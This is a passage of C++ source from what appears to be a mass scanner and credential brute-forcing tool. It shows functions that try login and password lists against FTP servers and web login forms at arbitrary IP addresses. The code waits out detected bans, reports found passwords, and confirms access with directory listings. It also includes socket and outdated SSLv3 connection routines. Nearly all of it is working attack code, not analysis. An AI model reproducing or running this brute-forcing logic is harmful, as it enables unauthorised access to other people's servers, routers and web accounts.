#pragma endregion

						strcpy(lps.login, "UNKNOWN");
						return lps;
					};

					if(strstr(recvBuff, "no such command"))
					{
						shutdown(sockFTP, SD_BOTH);
						closesocket(sockFTP);

						isActive = 0;
						stt->doEmition_BARedData("[-] 500 (Sorry, no such command) " + QString(ip));
						strcpy(lps.other, "[500 Sorry, no such command]");
						return lps;
					};

					if((strstr(recvBuff, "500 ") != NULL 
						|| strstr(recvBuff, "500-") != NULL 
						)
						&& strstri(recvBuff, "500 oops") == NULL
						)
					{
						j = 0;
						shutdown(sockFTP, SD_BOTH);
						closesocket(sockFTP);
						closedSocket = 1;
						ZeroMemory(recvBuff, sizeof(recvBuff));
						break;
					};

					if(strstr(recvBuff, "421 ") != NULL || strstr(recvBuff, "421-") != NULL)
					{
						shutdown(sockFTP, SD_BOTH);
						closesocket(sockFTP);
						closedSocket = 1;
						ZeroMemory(recvBuff, sizeof(recvBuff));
						break;
					};

					if(strstri(recvBuff, "530 Sorry, no ANONYMOUS access allowed.") != NULL)
					{
						++i;
						shutdown(sockFTP, SD_BOTH);
						closesocket(sockFTP);
						closedSocket = 1;
						ZeroMemory(recvBuff, sizeof(recvBuff));
						break;
					};

					if((strstr(recvBuff, "530 Sorry") != NULL) 
						|| (strstr(recvBuff, "530") != NULL && strstr(recvBuff, "maximum") != NULL)
						|| strstr(recvBuff, "exceeded") != NULL
						|| strstr(recvBuff, "421 Too many") != NULL
						|| strstr(recvBuff, "from this IP") != NULL
						|| strstr(recvBuff, "from your IP") != NULL) 
					{
#pragma region QTGUI_Area
						stt->doEmition_BARedData("[-] FTP: 530 - Ban detected? Waiting 30sec (" + QString(ip) + ")");
#pragma endregion
						shutdown(sockFTP, SD_BOTH);
						closesocket(sockFTP);
						closedSocket = 1;
						if(j > 0) --j;
						ZeroMemory(recvBuff, sizeof(recvBuff));
						Sleep(30000);
						break;
					}
					else if( (strstr(recvBuff, "220 ") != NULL || loginFailedFlag == 1 || strstr(recvBuff, "503") != NULL || strstr(recvBuff, "server ready") != NULL ))
					{
						strcpy(request, "USER ");
						if(strlen(loginLst[i]) != 0) strcat(request, loginLst[i]);
						else 
						{
							loginFailedFlag = 1;
							ZeroMemory(recvBuff, sizeof(recvBuff));
							break;
						};
						strcat(request, "\r\n");
						if(send(sockFTP, request, strlen(request), 0) != SOCKET_ERROR)
						{
							if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
							Activity += strlen(request);

							ZeroMemory(request, sizeof(request));
						}
						else
						{
							stt->doEmitionRedFoundData("[FTP] Send error. " + QString(ip) + ":" + QString::number(port));
						};
					}
					else if(strstr(recvBuff, "530") != NULL 
						|| strstr(recvBuff, "Login incorrect") != NULL 
						|| strstri(recvBuff, "500 oops") != NULL
						) 
					{	
						loginFailedFlag = 1;
						ZeroMemory(recvBuff, sizeof(recvBuff));
						break;
					}
					else if(strstr(recvBuff, "331") != NULL)
					{
						if(strstr(recvBuff, "Non-anonymous sessions must use encryption") != NULL 
							|| strstr(recvBuff, "Rejected--secure connection required") != NULL
							)
						{
							stt->doEmition_BARedData("FTP server (" + QString(ip) + ") appears to require SSL for specified user: " + QString(loginLst[i]));
							shutdown(sockFTP, SD_BOTH);
							closesocket(sockFTP);

							isActive = 0;

							strcpy(lps.login, "UNKNOWN");
							return lps;
						}
						else if(strstri(recvBuff, "permission denied") == NULL)
						{
							strcpy(request, "PASS ");
							if(strlen(passLst[j]) != 0) strcat(request, passLst[j]);
							else 
							{
								loginFailedFlag = 1;
								ZeroMemory(recvBuff, sizeof(recvBuff));
								break;
							};
							strcat(request, "\r\n");
							if(send(sockFTP, request, strlen(request), 0) != SOCKET_ERROR)
							{
								if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));

								Activity += strlen(request);
								ZeroMemory(request, sizeof(request));

								if(BALogSwitched) stt->doEmitionBAData("Probing FTP: " + QString(ip) + ":" + QString::number(port) + "; login/pass: " + QString(loginLst[i]) + ":" + QString(passLst[j]) + ";	- Progress: (" + QString::number((passCounter/(double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");
								++passCounter;
							}
							else
							{
								stt->doEmitionRedFoundData("[FTP] Send error. " + QString(ip) + ":" + QString::number(port));
							};
						}
						else
						{
							breakPassLoop = 1;
							stt->doEmition_BARedData("Permission denied for login - " + QString(ip) + ":" + QString::number(port) + "; login: " + QString(loginLst[i]));
							break;
						};
					}
					else if(strstr(recvBuff, "230") != NULL)
					{
						char pass[128] = {0};

						strcpy(pass, ip);
						strcat(pass, " - FTP Password found: ");
						strcat(pass, loginLst[i]);
						strcat(pass, ":");
						strcat(pass, passLst[j]);

						char recvBuff2[2048] = {0};
						if(send(sockFTP, "PASV\r\n", 6, 0) != SOCKET_ERROR)
						{
							int x = 1, xx = 0;
							while(x != 0)
							{
								ZeroMemory(recvBuff, sizeof(recvBuff));
								x = recvWT(sockFTP, recvBuff, sizeof(recvBuff), gTimeOut + 5, &bTO);
								xx += x;
								if(xx < 1536) strncat(recvBuff2, recvBuff, x);
								else break;
							};

							if(strstri(recvBuff2, "unknown command") != NULL || strstri(recvBuff2, "invalid command") != NULL)
							{
								stt->doEmitionYellowFoundData("[-] PASV failed. Router detected?");
								shutdown(sockFTP, SD_BOTH);
								closesocket(sockFTP);
								strcpy(lps.login, loginLst[i]);
								strcpy(lps.pass, passLst[j]);
								strcpy(lps.other, "ROUTER");
								isActive = 0;
								return lps;
							};

#pragma region Get pasv Port
							char *ptr0 = strstr(recvBuff2, "227 ");
							if( ptr0 != NULL )
							{
								if(strstr(ptr0, "(") != NULL)
								{
									char pasvData[32] = {0};
									char *ptr1 = strstr(ptr0, "(");
									char *ptr2 = strstr(ptr0, ")");
									int sz = ptr2 - ptr1 - 1;
									strncpy(pasvData, ptr1 + 1, sz);
									char *ptr3 = strstr(pasvData, ",");
									ptr3 = strstr(ptr3 + 1, ",");
									ptr3 = strstr(ptr3 + 1, ",");
									ptr3 = strstr(ptr3 + 1, ",");

									if(ptr3 != NULL)
									{
										char *ptrP2 = strstr(ptr3 + 1, ",");
										char p1c[8] = {0};
										sz = ptrP2 - ptr3 - 1;
										strncpy(p1c, ptr3 + 1, sz);
										int p1 = atoi(p1c);
										int p2 = atoi(ptrP2 + 1);
										port = p1 * 256 + p2;

										sockAddr.sin_port = htons(port);
										SOCKET newSockFTP = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
										connectionResult = connect(newSockFTP, (sockaddr*)&sockAddr, sizeof(sockAddr));

										send(sockFTP, "LIST\r\n", 6, 0);

										ZeroMemory(recvBuff, sizeof(recvBuff));
										int x = recvWT(newSockFTP, recvBuff, sizeof(recvBuff), gTimeOut + 3, &bTO);
										if(x <= 0 || strstr(recvBuff, "unknown command") != NULL) 
										{
											send(sockFTP, "MLSD\r\n", 6, 0);
											ZeroMemory(recvBuff, sizeof(recvBuff));
											x = recvWT(newSockFTP, recvBuff, sizeof(recvBuff), gTimeOut + 3, &bTO);
											if(x <= 0 || strstr(recvBuff, "unknown command") != NULL) 
											{
												stt->doEmition_BAGreenData("[?] " + QString(pass) + " 	[MLSD&LIST failed or server closed connection.]");
												shutdown(sockFTP, SD_BOTH);
												closesocket(sockFTP);
												shutdown(newSockFTP, SD_BOTH);
												closesocket(newSockFTP);
												closedSocket = 1;			
												isActive = 0;
												strcpy(lps.login, "UNKNOWN");
												return lps;
											}
											else stt->doEmition_BAGreenData("[+] " + QString(pass) + " 	[MLSD succeeded]");
										}
										else stt->doEmition_BAGreenData("[+] " + QString(pass) + " 	[LIST succeeded]");

										shutdown(newSockFTP, SD_BOTH);
										closesocket(newSockFTP);
									}
									else
									{
										stt->doEmitionYellowFoundData("[*] " + QString(ip) + " [PASV failed]");
									};
								}
								else
								{
									stt->doEmitionYellowFoundData("[*] " + QString(ip) + " 	[PASV TO] Failed!");
								};
							}
							else
							{
								stt->doEmitionYellowFoundData("[*] " + QString(ip) + " 	[PASV TO] Failed!");
							};
#pragma endregion

							if(xx > 1)
							{
								strcpy(ps->headr, "</a><pre><font color=\"goldenrod\"> (");
								strncat(ps->headr, recvBuff, 256);
								strcat(ps->headr, ")</font></pre>");
							};

							strcpy(lps.login, loginLst[i]);
							strcpy(lps.pass, passLst[j]);

							shutdown(sockFTP, SD_BOTH);
							closesocket(sockFTP);
							isActive = 0;
							return lps;
						}
						else
						{
							stt->doEmitionRedFoundData("[FTP] Send error. " + QString(ip) + ":" + QString::number(port));

							strcpy(lps.login, loginLst[i]);
							strcpy(lps.pass, passLst[j]);

							shutdown(sockFTP, SD_BOTH);
							closesocket(sockFTP);
							isActive = 0;
							return lps;
						};
					};
				};
				shutdown(sockFTP, SD_BOTH);
				closesocket(sockFTP);
				closedSocket = 1;
				ZeroMemory(recvBuff, sizeof(recvBuff));
			}
			else
			{
				char err[128] = {0};

				int WSAerr;
				if(connectionResult == -1) WSAerr = WSAGetLastError();
				else WSAerr = 10060;

				if(gThreads > 1 && WSAerr != 10060/*Timeout*/ && WSAerr != 10055/*POOLOVERFLOW*/ && WSAerr != 10061/*WSAECONNREFUSED*/ && WSAerr != 10054/*WSACONNABORTED*/ && WSAerr != 0) 
				{
					strcpy(err, "[FTPBrute] Cannot connect to ");
					strcat(err, ip);
					strcat(err, " [");
					strcat(err, std::to_string((long double)WSAerr).c_str());
					strcat(err, "]");

#pragma region QTGUI_Area
					stt->doEmitionRedFoundData(QString(err));
#pragma endregion
				};

				shutdown(sockFTP, SD_BOTH);
				closesocket(sockFTP);		
				isActive = 0;
				strcpy(lps.login, "UNKNOWN");
				return lps;
			};
			Sleep(100);

			if(breakPassLoop) 
			{
				breakPassLoop = false;
				break;
			};
		};
	};
	shutdown(sockFTP, SD_BOTH);
	closesocket(sockFTP);
	isActive = 0;
	strcpy(lps.login, "UNKNOWN");
	return lps;
};
lopaStr Connector::_FTPLobby(char *ip, int port, PathStr *ps)
{
	while(BrutingThrds >= gMaxBrutingThreads) Sleep(700);

	lopaStr lps;
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));

	BConInc();
	lps = _FTPBrute(ip, port, ps);
	BConDec();
	
	return lps;
};
int _sslConnectTo(char *iph, int porth, char *requesth, conSTR *CSTR)
{
	SSL *ssl = NULL;
	int bytes = 0;
	char *recvBuff2 = 0;
	int resCode = 0;
	SOCKET sock;

	SSL_CTX *ctx = NULL;
	const SSL_METHOD *method = SSLv3_client_method();  /* Create new client-method instance */
	ctx = SSL_CTX_new(method);   /* Create new context */
	SSL_CTX_set_timeout(ctx, gTimeOut);
	if(ctx != NULL)
	{
		resCode = OpenConnection(&sock, iph, porth);
		if(resCode >= 0)
		{
			ssl = SSL_new(ctx);      /* create new SSL connection state */
			SSL_set_fd(ssl, sock);    /* attach the socket descriptor */

			if(SSL_connect(ssl))
			{
				SSL_write(ssl, requesth, strlen(requesth));
				if(MapWidgetOpened) stt->doEmitionAddOutData(QString(iph), QString(requesth));

				int x = 256;
				char recvBuff[8192] = {0};
				recvBuff2 = new char[RECV_MAX_SIZE];
				ZeroMemory(recvBuff2, RECV_MAX_SIZE);

				while (x > 0)		
				{
					ZeroMemory(recvBuff, sizeof(recvBuff));
					x = SSL_read(ssl, recvBuff, sizeof(recvBuff));
					if(x <= 0) break;

					bytes += x;
					Activity += x;

					if( bytes > RECV_MAX_SIZE ) 
					{
						if(strstri(recvBuff2, "http/1.") == NULL)
						{
							if(HTMLDebugMode) _DebugWriteHTMLToFile(requesth, recvBuff2);
							delete[] recvBuff2;
							recvBuff2 = NULL;
							shutdown(sock, SD_BOTH);
							closesocket(sock);
							++Overl;

							CSTR->lowerBuff = new char[11];
							strcpy(CSTR->lowerBuff, "[OVERFLOW]");
							CSTR->size = 10;
							SSL_free(ssl);
							SSL_CTX_free(ctx);        /* release context */
							return 0;
						} 
						else break;
					};
					if(globalScanFlag == true)
					{
						if(x > 0)
						{
							memset((void*)(recvBuff + x), '\0', 1);
							strcat(recvBuff2, recvBuff);
						}
						else
						{
							if(HTMLDebugMode) _DebugWriteHTMLToFile(requesth, recvBuff2);

							delete[] recvBuff2;
							recvBuff2 = NULL;
							shutdown(sock, SD_BOTH);
							closesocket(sock);
							CSTR->lowerBuff = new char[12];
							strcpy(CSTR->lowerBuff, "[IGNR_ADDR]");

							CSTR->size = 11;
							SSL_free(ssl);
							SSL_CTX_free(ctx);        /* release context */
							return 0;
						};
					};
				};

				if(bytes < 0)
				{
					stt->doEmitionRedFoundData("[SSL](_SSLConnect [bytes < 0]) " + QString(iph) + ":" + QString::number(porth));
				};

				SSL_free(ssl);
				shutdown(sock, SD_BOTH);
				closesocket(sock);         /* close socket */
				SSL_CTX_free(ctx);        /* release context */

				if(bytes == 0 || recvBuff2 == NULL)
				{
					if(recvBuff2 != NULL) delete []recvBuff2;
					recvBuff2 = NULL;
					CSTR->lowerBuff = new char[1];
					strcpy(CSTR->lowerBuff, "");
					CSTR->size = 0;
					return -1;
				};
				if(MapWidgetOpened) stt->doEmitionAddIncData(QString(iph), QString(recvBuff2));
				std::string res2 = "";
				if(strlen(recvBuff2) > bytes) bytes = strlen(recvBuff2);
				CSTR->lowerBuff = new char[bytes + 1];
				ZeroMemory(CSTR->lowerBuff, sizeof(CSTR->lowerBuff));

				strncpy(CSTR->lowerBuff, recvBuff2, bytes);

				delete[] recvBuff2;
				recvBuff2 = NULL;
				CSTR->size = bytes;
				if(HTMLDebugMode) _DebugWriteHTMLToFile(requesth, CSTR->lowerBuff);
				return 0;
			}
			else
			{
				delete[] recvBuff2;
				recvBuff2 = NULL;
				shutdown(sock, SD_BOTH);
				closesocket(sock);         /* close socket */
				SSL_free(ssl);
				SSL_CTX_free(ctx);        /* release context */
				CSTR->lowerBuff = new char[1];
				strcpy(CSTR->lowerBuff, "");
				CSTR->size = 0;
				return 0;
			};
		};
	};
	stt->doEmitionRedFoundData("SSL(InitCTX).");
	return -1;
};
int Connector::_EstablishSSLConnection(char *iph, int porth, char *requesth, conSTR *CSTR)
{
	return _sslConnectTo(iph, porth, requesth, CSTR);
};
void __deleteExcessiveNullBytes(char *buff, int sz)
{
	int j = 0;
	for(int i = 0; i < sz - 1; ++i)
	{
		if(buff[i] != 0) buff[j++] = buff[i];
	};
};
struct linger linger = { 0 };
int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *CSTR, int force)
{
	CSTR->lowerBuff = NULL;
	if(strlen(ip) == 0) 
	{	
		stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad IP.");
		return -1;
	};
	if(port < 0 || port > 65535) 
	{
		stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Rejecting in _connection: Bad port.");
		return -1;
	};

	int recvBuffSize = 0;
	char *recvBuff2 = NULL;
	char request[2049] = {0};
	strcpy(request, requesth);
	sockaddr_in sockAddr;  
	sockAddr.sin_family = AF_INET;  
	sockAddr.sin_port = htons(port);

	HOSTENT *host;  
#if defined(WIN32)
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
#else
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
#endif
	else if(host = gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
	else 
	{
		++offlines;
		if(host == NULL) return -2;
		else return -1;
	};

	SOCKET sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	while(sock == INVALID_SOCKET)
	{
		char temp[64] = {0};
		strcpy(temp, "Cannot create socket - ");
		strcat(temp, std::to_string((long double)WSAGetLastError()).c_str());
		strcat(temp, " - ");
		strcat(temp, ip);
		strcat(temp, ":");
		strcat(temp, std::to_string((long double)port).c_str());

#pragma region QTGUI_Area
		stt->doEmitionRedFoundData(QString(temp));
#pragma endregion

		shutdown(sock, SD_BOTH);
		closesocket(sock);
		Sleep(500);
		sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	};

	int iiError = WSAGetLastError();
	while(iiError == 10038)
	{
		if(gDebugMode) stt->doEmitionDebugFoundData("[ConnectTo] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");

		shutdown(sock, SD_BOTH);
		closesocket(sock);
		sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
		iiError = WSAGetLastError();
	};
#if defined(WIN32)
	u_long FAR cmd = 1;
	if( ioctlsocket( sock , FIONBIO, &cmd ) != 0 )
#else
	if( fcntl( sock , F_SETFL, O_NDELAY ) == -1 )
#endif
	{
		char temp[64] = {0};
		strcpy(temp, "Error setting non-blocking mode - ");
		strcat(temp, std::to_string((long double)WSAGetLastError()).c_str());
		strcat(temp, " - ");
		strcat(temp, ip);
		strcat(temp, ":");
		strcat(temp, std::to_string((long double)port).c_str());

#pragma region QTGUI_Area
		stt->doEmitionRedFoundData(QString(temp));
#pragma endregion

		shutdown(sock, SD_BOTH);
		closesocket(sock);
	}

	int on = 1;
	linger.l_onoff = 1;
	linger.l_linger = 30;
	setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (const char *) &on, sizeof(on));
	setsockopt(sock, SOL_SOCKET, SO_LINGER, (const char *) &linger, sizeof(linger));

	int iError, iResult = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
	if(iResult == SOCKET_ERROR)
	{
		iError = WSAGetLastError();
		while(iError == 10038)
		{
			if(gDebugMode) stt->doEmitionDebugFoundData("[ConnectTo] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");

			shutdown(sock, SD_BOTH);
			closesocket(sock);
			sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
			iResult = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
			iError = WSAGetLastError();
		};
		if(iError == 10035)
		{
			fd_set read_fs;
			FD_ZERO(&read_fs); 
			FD_SET(sock, &read_fs);
			timeval tv = { gTimeOut, 0 };

			iResult = select(sock + 1, NULL, &read_fs, 0, &tv);
			int cErrCode = WSAGetLastError();
			while(cErrCode == 10038)
			{
				if(gDebugMode) stt->doEmitionDebugFoundData("[ConnectTo] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");

				shutdown(sock, SD_BOTH);
				closesocket(sock);
				FD_CLR(sock, &read_fs); 
				sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
				connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
				iResult = WSAGetLastError();
				if(iResult == 10038) continue;
				FD_SET(sock, &read_fs);
				iResult = select(sock + 1, NULL, &read_fs, 0, &tv);
				cErrCode = WSAGetLastError();
			};

			if (iResult == SOCKET_ERROR) 
			{
				++offlines;
				char temp[128] = {0};
				strcpy(temp, "[Omitting IP!] Select error - ");
				strcat(temp, std::to_string((long double)cErrCode).c_str());
				strcat(temp, " - ");
				strcat(temp, ip);
				strcat(temp, ":");
				strcat(temp, std::to_string((long double)port).c_str());
				strcat(temp, ";");
#pragma region QTGUI_Area
				stt->doEmitionRedFoundData(QString(temp));
#pragma endregion
				ZeroMemory(temp, sizeof(temp));
			}
			else
			{
				if (!iResult) ++offlines;
				else
				{
					if(send(sock, request, strlen(request), 0) != SOCKET_ERROR) 
					{
						if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
						Activity += strlen(request);
						int x = 256;
						char recvBuff[4096] = {0};
						recvBuff2 = new char[RECV_MAX_SIZE];
						ZeroMemory(recvBuff2, RECV_MAX_SIZE);

						int bTO;
						while (x > 0)				
						{
							ZeroMemory(recvBuff, sizeof(recvBuff));
							x = recvWT(sock, recvBuff, sizeof(recvBuff), gTimeOut, &bTO);
							if(x <= 0) break;
							Activity += x;
							recvBuffSize += x;
							if( recvBuffSize > RECV_MAX_SIZE ) 
							{ 
								delete[] recvBuff2;
								recvBuff2 = NULL;

								FD_CLR(sock, &read_fs);
								shutdown(sock, SD_BOTH);
								closesocket(sock);
								++Overl;

								CSTR->lowerBuff = new char[11];
								strcpy(CSTR->lowerBuff, "[OVERFLOW]");
								CSTR->size = 10;
								return 0;
							};
							strncat(recvBuff2, recvBuff, x);
						};
					}
					else
					{
						++offlines;
						char temp[128] = {0};
						strcpy(temp, "Send error! - ");
						strcat(temp, std::to_string((long double)WSAGetLastError()).c_str());
						strcat(temp, " - ");
						strcat(temp, ip);
						strcat(temp, "; sock: ");
						strcat(temp, std::to_string((long double)sock).c_str());

#pragma region QTGUI_Area
						stt->doEmitionRedFoundData(QString(temp));
#pragma endregion
						ZeroMemory(temp, sizeof(temp));
					};
				};
			};
			FD_CLR(sock, &read_fs);
			shutdown(sock, SD_BOTH);
			closesocket(sock);
		}
		else 
		{
			++offlines;
			char temp[128] = {0};
			int err = iError;
			if(err == 10055) 
			{
				strcpy(temp, "-Connection pool depleted- ");
#pragma region QTGUI_Area
				stt->doEmitionRedFoundData("[SOCKERR 10055] " + QString(temp) + QString(ip) + ":" + QString::number(port));
#pragma endregion
				shutdown(sock, SD_BOTH);
				closesocket(sock);
				Sleep(60000);
			}
			else if(err == 10049)
			{
				strcpy(temp, "[ADDR_NOT_AVAIL - ");
				strcat(temp, ip);
				strcat(temp, ":");
				strcat(temp, std::to_string((long double)port).c_str());
				strcat(temp, " - ");
				strcat(temp, std::to_string((long double)err).c_str());
				strcat(temp, "]");
#pragma region QTGUI_Area
				stt->doEmitionRedFoundData(QString(temp));
#pragma endregion
				shutdown(sock, SD_BOTH);
				closesocket(sock);
			}
			else
			{
				strcpy(temp, "[Unpredictable error - ");
				strcat(temp, ip);
				strcat(temp, ":");
				strcat(temp, std::to_string((long double)port).c_str());
				strcat(temp, " - ");
				strcat(temp, std::to_string((long double)err).c_str());
				strcat(temp, "]");
				strcat(temp, "; sock: ");
				strcat(temp, std::to_string((long double)sock).c_str());
#pragma region QTGUI_Area
				stt->doEmitionRedFoundData(QString(temp));
#pragma endregion
				shutdown(sock, SD_BOTH);
				closesocket(sock);
			};
		};
	}
	else
	{
		char temp[128] = {0};
		strcpy(temp, "[?!] Strange behavior detected - ");
		strcat(temp, std::to_string((long double)WSAGetLastError()).c_str());
		strcat(temp, " - ");
		strcat(temp, ip);
		strcat(temp, ":");
		strcat(temp, std::to_string((long double)port).c_str());
		strcat(temp, "; sock: ");
		strcat(temp, std::to_string((long double)sock).c_str());
#pragma region QTGUI_Area
		stt->doEmitionRedFoundData(QString(temp));
#pragma endregion
	};

	if( globalScanFlag == false && force == 0) 
	{
		if(recvBuff2 != NULL) delete []recvBuff2;
		recvBuff2 = NULL;
		return -1;
	};

	if(recvBuff2 != NULL && recvBuffSize > 0)
	{
		if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff2));
		CSTR->lowerBuff = new char[recvBuffSize + 1];
		ZeroMemory(CSTR->lowerBuff, recvBuffSize + 1);
		CSTR->size = recvBuffSize;
		strncpy(CSTR->lowerBuff, recvBuff2, recvBuffSize);
		memset(CSTR->lowerBuff + recvBuffSize, '\0', 1);

		delete []recvBuff2;
		recvBuff2 = NULL;
		if(HTMLDebugMode) _DebugWriteHTMLToFile(requesth, CSTR->lowerBuff);
		return 0;
	}
	else 
	{
		if(recvBuff2 != NULL) delete []recvBuff2;
		recvBuff2 = NULL;
		return -1;
	};
};

#pragma region WF
lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionVal, char *userVal, char *passVal, char *formVal)
{
	lopaStr lps;
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));
	
	int cookieLen = strlen(cookie);

	char b[16] = {0};
	char request[2048] = {0};
	char argData[256] = {0};
	char recvBuffer[65536] = {0};

	Connector con;
	conSTR CSTR;
	int cRes;
	int firstCycle = 0;
	if(strstri(methodVal, "get") != NULL)
	{
		int passCounter = 1;
		for(int i = 0; i < MaxWFLogin; ++i)
		{
			if(globalScanFlag == false) break;
			for(int j = firstCycle; j < MaxWFPass; ++j)
			{
				if(globalScanFlag == false) break;
				CSTR.lowerBuff = NULL;
				CSTR.size = 0;
				cRes = 0;

				strcpy(request, "GET ");
				strcat(request, actionVal);
				strcat(request, "?");
				strcat(request, userVal);
				strcat(request, "=");
				strcat(request, wfLoginLst[i]);
				strcat(request, "&");
				strcat(request, passVal);
				strcat(request, "=");
				strcat(request, wfPassLst[j]);
				strcat(request, " HTTP/1.1\r\n");
				strcat(request, "Host: ");
				strcat(request, ip);
				strcat(request, ":");
				char tbuff[16] = {0};
				strcat(request, itoa(port, tbuff, 10));
				if(cookieLen != 0)
				{
					strcat(request, "\r\nCookie: ");
					strcat(request, cookie);
				};
				strcat(request, "\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: us-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nConnection: close");
				strcat(request, "\r\n\r\n");

				if(port == 443) cRes = con._EstablishSSLConnection(ip, port, request, &CSTR);
				else cRes = con._EstablishConnection(ip, port, request, &CSTR);

				if(BALogSwitched) stt->doEmitionBAData("Checked WF: " + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(wfLoginLst[i]) + ":" + QString(wfPassLst[j]) + ";	- Progress: (" + QString::number((passCounter/(double)(MaxWFPass*MaxWFLogin)) * 100).mid(0, 4) + "%)");
				++passCounter;

				if(CSTR.lowerBuff != NULL)
				{
					if(strstri(CSTR.lowerBuff, "501 not implemented") != NULL)
					{
						stt->doEmitionRedFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: 501 Not Implemented.");						
						isActive = 0;
						strcpy(lps.login, "UNKNOWN");
						return lps;
					};
					if(strstri(CSTR.lowerBuff, "404 not found") != NULL)
					{
						stt->doEmitionRedFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: 404 Not Found.");						
						isActive = 0;
						strcpy(lps.login, "UNKNOWN");
						return lps;
					};
					if(strstri(CSTR.lowerBuff, "Access is Denied") == NULL
						&& strstri(CSTR.lowerBuff, "Location:") == NULL
						&& strstri(CSTR.lowerBuff, "Access forbidden") == NULL
						&& strstri(CSTR.lowerBuff, "Authentication required") == NULL
						&& strstri(CSTR.lowerBuff, "invalid") == NULL
						&& strstri(CSTR.lowerBuff, "error") == NULL
						&& strstri(CSTR.lowerBuff, "loginerr") == NULL
						&& strstri(CSTR.lowerBuff, "passerr") == NULL
						&& strstri(CSTR.lowerBuff, "passworderr") == NULL
						&& strstri(CSTR.lowerBuff, "location.href") == NULL
						&& strstri(CSTR.lowerBuff, "location.replace") == NULL
						&& strstri(CSTR.lowerBuff, "top.location") == NULL
						&& strstri(CSTR.lowerBuff, "error_status") == NULL
						&& strstri(CSTR.lowerBuff, "501 not implemented") == NULL
						&& strstri(CSTR.lowerBuff, "http-equiv=\"refresh\"") == NULL
						&& strstri(CSTR.lowerBuff, "http-equiv = \"refresh\"") == NULL
						&& strstri(CSTR.lowerBuff, "busy") == NULL
						&& strstri(CSTR.lowerBuff, "later") == NULL
						&& strstri(CSTR.lowerBuff, "verification failed") == NULL
						&& strstri(CSTR.lowerBuff, "403 Forbidden") == NULL
						&& strstri(CSTR.lowerBuff, formVal) == NULL

						)
					{
						if(i == 0) 
						{
							ZeroMemory(request, sizeof(request));

							isActive = 0;

							strcpy(lps.login, "UNKNOWN");
							return lps;
						};
						char pass[256] = {0};

						ZeroMemory(pass, sizeof(pass));
						strcpy(pass, ip);
						strcat(pass, " - Web Form password found: ");
						strcat(pass, wfLoginLst[i]);
						strcat(pass, ":");
						strcat(pass, wfPassLst[j]);
						isActive = 0;
#pragma region QTGUI_Area
						stt->doEmition_BAGreenData("[+] " + QString(pass));
#pragma endregion
						strcpy(lps.login, wfLoginLst[i]);
						strcpy(lps.pass, wfPassLst[j]);
						return lps;
					};
				}
				else
				{
					ZeroMemory(request, sizeof(request));

					isActive = 0;

					strcpy(lps.login, "UNKNOWN");
					return lps;
				};

				if(i == 0) ++i;
				ZeroMemory(request, sizeof(request));
			};
			firstCycle = 1;
		};
	}
	else if(strstri(methodVal, "post") != NULL)
	{
		int passCounter = 1;
		int firstCycle = 0;
		for(int i = 0; i < MaxWFLogin; ++i)
		{
			if(globalScanFlag == false) break;
			for(int j = firstCycle; j < MaxWFPass; ++j)
			{
				if(globalScanFlag == false) break;
				CSTR.lowerBuff = NULL;
				CSTR.size = 0;
				cRes = 0;

				strcpy(argData, userVal);
				strcat(argData, "=");
				strcat(argData, wfLoginLst[i]);
				strcat(argData, "&");
				strcat(argData, passVal);
				strcat(argData, "=");
				strcat(argData, wfPassLst[j]);

				strcpy(request, "POST ");
				strcat(request, actionVal);
				strcat(request, " HTTP/1.1\r\n");
				strcat(request, "Host: ");
				strcat(request, ip);
				strcat(request, ":");
				char tbuff[16] = {0};
				strcat(request, itoa(port, tbuff, 10));
				if(cookieLen != 0)
				{
					strcat(request, "\r\nCookie: ");
					strcat(request, cookie);
				};
